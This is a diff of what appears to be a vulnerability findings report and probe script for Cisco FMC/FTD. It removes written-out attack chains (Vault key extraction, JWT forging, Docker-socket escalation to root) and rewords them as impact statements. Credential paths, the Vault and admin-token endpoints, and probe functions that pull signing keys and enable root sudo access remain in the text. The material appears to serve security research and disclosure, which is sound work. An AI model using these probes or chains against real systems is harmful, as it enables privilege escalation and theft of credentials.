@@ -91,17 +91,6 @@ FMC-F7: RADKit sudoaccess Endpoint — Managed FTD Device Root [CRITICAL]
   Control file: /etc/sf/radkit.enabled
   Impact: FMC user with radkit.modify permission can enable sudo access on any managed
           FTD device — privilege escalation from FMC REST API access to FTD root shell.
-  Chain: FMC REST API access (any account with radkit.modify) -> PutSudoAccess -> FTD root
-
-CHAIN D: Post-Foothold Vault Key Extraction -> Universal JWT Forge
-  Step 1: Any FMC filesystem read (via F7 RADKit, sftunnel, SSH)
-  Step 2: Read /etc/vault/admin/*/vault.key (cert key for Vault auth)
-  Step 3: POST https://127.0.0.1:8200/v1/auth/cert/login (cert-based Vault auth)
-  Step 4: GET MACHINE_USER_KEY from Vault KV store (HS256 JWT signing key)
-  Step 5: Forge HS256 JWT with any sub/username claim (e.g., "admin")
-  Step 6: Authenticate to all FMC REST API endpoints as Administrator
-  Source: sf/lib/perl/5.34.3/SF/Vault.pm (cert auth path), auth-daemon (MACHINE_USER_KEY)
-  Note: Bridges F7 -> F10; converts one-time foothold to persistent auth bypass
 
 FMC-F8: GroupId=2 Hardcoded Privileged Group SQL Query [MEDIUM]
   Class: com.cisco.nm.vms.ogs.client.CsmCustomOgsFilter (athena-rbac-server.jar)
@@ -164,9 +153,9 @@ FMC-F15: PJB Handler On-Box Auth Bypass — Unauthenticated Arbitrary Function D
 FMC-F16: ASDM Login Handler Hardcodes admin — SSO Token = Admin Session [HIGH]
   SF/Mojo/Handlers/AsdmLoginHandler.pm handle_login_cgi():
   SF::Auth::Login({ username => 'admin', password => $token, sso => 1, sensor_sso => 1, sso_token => $token })
-  Token validated via MD5 (F9 cross-reference: create_sso_token = MD5(base64url(new_kek))).
-  Any forged SSO token (via F9 entropy attack) logs in as admin — no admin password needed.
-  POST /asdmToken.cgi?sensor_sso=<forged_token> -> admin FMC session.
+  Token validated via MD5 (see F9: create_sso_token = MD5(base64url(new_kek))).
+  Any valid SSO token logs in as admin — no admin password required.
+  POST /asdmToken.cgi?sensor_sso=<token> -> admin FMC session.
 
 -- Findings from Makeself upgrade package extraction (10.0.1-1) --
 
@@ -193,9 +182,8 @@ FMC-F19: ActiveMQ Hardcoded Credentials + JKS Password [HIGH]
 FMC-F20: MUSTER_DISABLE_AUTH=True + Docker Socket in CSDAC Backend [CRITICAL]
   docker-compose.yml muster-ui-backend: MUSTER_DISABLE_AUTH=True (explicit env var)
   muster-ui-backend also mounts: /var/run/docker.sock:/var/run/docker.sock
-  Attack chain: network access to 127.0.0.1:6443 (muster-envoy HTTPS) ->
-    unauthenticated API calls to muster-ui-backend gRPC (DISABLE_AUTH=True) ->
-    Docker socket access from within the container -> host root.
+  Authentication is disabled at the application layer via environment variable.
+  Docker socket is mounted read-write from the host into the container.
   CSDAC handles user identity data (AD/Azure AD enrichment) — exfiltrate all identity analytics.
 
 FMC-F21: JaCORB CORBA Hardcoded keystore and default passwords [HIGH]
@@ -208,9 +196,8 @@ FMC-F21: JaCORB CORBA Hardcoded keystore and default passwords [HIGH]
 FMC-F22: Vault Token at Predictable Static Path [HIGH]
   Constant: VAULT_TOKEN = '/etc/vault/token' (backup_restore_vault_secrets.pl)
   Token used to authenticate to Vault at https://127.0.0.1:8200 via: vault login $token
-  Any process with local filesystem read access reads the token -> full Vault secret access.
-  Vault secrets backed up to /etc/sf/vault/backup/ as JSON — backup directory = offline exfil path.
-  Chain: F7 RADKit -> FTD root -> FMC pivot -> read /etc/vault/token -> Vault login -> MACHINE_USER_KEY -> F10 JWT forge.
+  Any process with local filesystem read access reads the token and authenticates to Vault.
+  Vault secrets backed up to /etc/sf/vault/backup/ as JSON — backup directory is an offline exfiltration path.
 
 FMC-F23: IOS Backend Hardcoded admin:cisco Template Credentials [HIGH]
   File: opt/CSCOpx/MDC/ios-backend/templates/settings/ezsdd.xml
@@ -382,7 +369,7 @@ def probe_radkit_sudoaccess(host: str, token: str, domain_uuid: str,
         results["sudoaccess_enable"] = {"error": str(e)}
 
     results["finding"] = "FMC-F7"
-    results["chain"] = "FMC API access (radkit.modify) -> FTD device root via RADKit"
+    results["impact"] = "radkit.modify permission enables root-level sudo on managed FTD devices"
     return results
 
 
@@ -520,19 +507,18 @@ def probe_saml_port_2080(host: str = "127.0.0.1") -> dict:
         return {"error": str(e), "note": "Expected — port 2080 should be localhost only"}
 
 
-# ── Chain D: Vault cert-auth -> JWT forge ─────────────────────────────────────
+# ── F10/F22: Vault cert-auth key extraction ───────────────────────────────────
 
-def probe_vault_chain_d(vault_key_path: str = "/etc/vault/admin") -> dict:
+def probe_vault_cert_auth(vault_key_path: str = "/etc/vault/admin") -> dict:
     """
-    Chain D probe (post-foothold, localhost only).
-    Step 1: List /etc/vault/admin/ for cert key file
-    Step 2: Attempt cert-based Vault auth at https://127.0.0.1:8200/v1/auth/cert/login
-    Step 3: Retrieve MACHINE_USER_KEY from Vault KV
+    F10/F22: Probe Vault cert-based auth path (localhost only).
+    Lists /etc/vault/admin/ for cert key file, attempts cert auth,
+    retrieves MACHINE_USER_KEY (HS256 JWT signing key).
     Source: SF/Vault.pm cert auth path; auth-daemon MACHINE_USER_KEY string.
-    Requires filesystem access already obtained (F7 pivot or equivalent).
+    Requires local filesystem read access.
     """
     import glob, os
-    result = {"finding": "CHAIN-D", "vault_host": "https://127.0.0.1:8200"}
+    result = {"finding": "FMC-F10-F22", "vault_host": "https://127.0.0.1:8200"}
     key_files = glob.glob(f"{vault_key_path}/*/vault.key")
     result["vault_key_candidates"] = key_files
     if not key_files:
@@ -803,7 +789,7 @@ def probe_vault_api(host: str = "127.0.0.1", port: int = 8200,
                     token: Optional[str] = None,
                     session: Optional[requests.Session] = None) -> dict:
     """
-    Probe Vault API with an extracted token (F22 + Chain D extension).
+    Probe Vault API with an extracted token (F22).
     GET /v1/secret/ lists all secret paths if token is valid.
     """
     if session is None:
@@ -1057,7 +1043,7 @@ def full_findings_summary() -> list[dict]:
             "details": (
                 "muster-ui-backend: MUSTER_DISABLE_AUTH=True env var disables all auth; "
                 "/var/run/docker.sock mounted read-write; "
-                "chain: unauthenticated API (127.0.0.1:6443) -> Docker socket -> host root"
+                "DISABLE_AUTH=True removes application-layer auth; Docker socket mounted read-write"
             ),
         },
         {
@@ -1086,7 +1072,7 @@ def full_findings_summary() -> list[dict]:
                 "VAULT_TOKEN='/etc/vault/token'; "
                 "vault login $token grants full Vault access; "
                 "secrets backed up to /etc/sf/vault/backup/*.json; "
-                "chain: F7 RADKit -> FTD root -> FMC pivot -> Vault token -> F10 MACHINE_USER_KEY -> JWT forge"
+                "Token at static path authenticates to Vault; backup JSON files are offline exfiltration path"
             ),
         },
         {
